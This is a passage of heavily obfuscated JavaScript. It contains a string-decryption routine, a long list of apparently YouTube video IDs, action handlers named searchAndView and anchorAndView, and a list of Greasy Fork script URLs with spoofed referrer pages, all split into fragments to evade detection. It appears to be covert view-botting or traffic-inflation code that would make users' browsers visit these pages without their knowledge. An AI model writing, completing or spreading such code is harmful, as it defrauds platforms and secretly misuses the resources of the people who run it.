        for (let r = -0x179d + -0x67 * 0x57 + -0x16e * -0x29, s, t, u = 0xb7b + 0x9b8 * 0x4 + -0x325b; t = n['charAt'](u++); ~t && (s = r % (0x1cf * 0x8 + -0x592 * -0x2 + 0x68 * -0x3f) ? s * (0x5 * -0x623 + -0x80 * -0x4a + -0x611) + t : t, r++ % (0x2 * 0xf76 + 0x881 + -0x13 * 0x213)) ? p += String['fromCharCode'](-0x85b + -0x1748 * -0x1 + -0x6f7 * 0x2 & s >> (-(-0x1ef2 + -0x1 * 0x653 + 0x1 * 0x2547) * r & -0xebe + 0x115 * 0xb + 0x2dd)) : 0x755 * 0x1 + -0xed * -0x23 + -0x27bc) {
          t = o['indexOf'](t);
        }
        for (let v = -0x229 * 0x11 + -0x19b0 + 0x3e69, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x205f * 0x1 + -0x1e43 + 0x3eb2))['slice'](-(-0x18dd + -0x589 + 0x1e68));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x259 * 0x2 + 0x33 * 0x7 + -0x617,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x3a6 * -0x2 + -0x24 * 0xef + -0x10 * -0x1a5; u < -0x1 * -0x100 + 0x1cb6 + 0x23 * -0xd2; u++) {
          p[u] = u;
        }
        for (u = 0xa * 0x2b3 + -0x2509 + 0xa0b; u < 0x1078 + 0x1 * -0x123d + 0x1 * 0x2c5; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x141b * -0x1 + 0x13e8 + -0x2703), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1118 + 0x409 * -0x2 + -0x906, q = 0x21d3 + 0x182 + -0x1 * 0x2355;
        for (let v = 0x2282 + -0x1a1c + -0x866; v < n['length']; v++) {
          u = (u + (-0x2650 + 0x17ff + 0xe52)) % (0x10a3 * -0x2 + 0x124d + 0xff9), q = (q + p[u]) % (0x8b * 0x19 + 0x1c90 * -0x1 + 0x1 * 0xffd), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * 0x6a0 + -0x110b + 0x1 * 0x18ab)]);
        }
        return t;
      };
      b['pSkibs'] = m, c = arguments, b['VRxksa'] = !![];
    }
    const j = e[0xb7b + -0x1eea * 0x1 + 0x5 * 0x3e3],
      k = f + j,
      l = c[k];
    return !l ? (b['mFIdvq'] === undefined && (b['mFIdvq'] = !![]), h = b['pSkibs'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    X(0x18) + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    W(0x15) + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    Y(0x8, 'Yz36') + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    X(0x7) + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    Y(0x11, 'Kmvr') + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + Y(0xb, 'i(xh') + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + X(0x5) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x9, 'gp(y') + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + X(0x3),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + Y(0x0, 'Yz36') + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
